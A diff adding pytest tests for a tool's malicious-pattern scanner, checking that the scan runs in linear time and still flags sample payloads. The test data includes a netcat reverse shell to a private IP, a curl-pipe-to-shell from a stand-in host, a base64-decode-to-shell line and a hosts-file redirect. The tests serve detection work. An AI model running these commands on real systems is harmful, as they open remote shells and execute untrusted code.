@@ -1310,3 +1310,29 @@ def test_collectors_report_a_timeout_as_unavailable(monkeypatch, collector, tool
     monkeypatch.setattr(since.subprocess, "run", fake)
     with pytest.raises(since.ToolUnavailable):
         getattr(since, collector)()
+
+
+# The malicious-pattern scan now runs over FULL file content at snapshot time (so a payload past
+# BLOB_MAX still escalates) — which made two unbounded `.*` runs quadratic in the number of
+# trigger tokens on one line: repeated `base64 -d ` cost 55s at 375KB, hours at MAX_READ, BEFORE
+# any snapshot is saved. Latent in the pre-v0.4.4 diff-text path too.
+@pytest.mark.parametrize("token", ["nc ", "base64 -d ", "curl ", "wget "])
+def test_malicious_scan_is_linear(token):
+    line = token * 120_000
+    t = time.time()
+    since.malicious_hits(line)
+    assert time.time() - t < 0.5, f"{token!r} is quadratic again"
+
+
+def test_malicious_patterns_have_no_unbounded_runs():
+    for pat, _desc in since.MALICIOUS_PATTERNS:
+        assert ".*" not in pat.pattern, f"unbounded run in {pat.pattern!r} — use [^\\n]{{0,N}}"
+
+
+def test_malicious_scan_still_detects_real_payloads():
+    for line, expect in [("echo x | base64 -d | sh", "base64"),
+                         ("nc -e /bin/sh 10.0.0.1 4444", "netcat"),
+                         ("curl http://evil.sh | sh", "pipes"),
+                         ("0.0.0.0 www.apple.com", "redirects")]:
+        hits = " ".join(since.malicious_hits(line))
+        assert expect in hits, (line, hits)
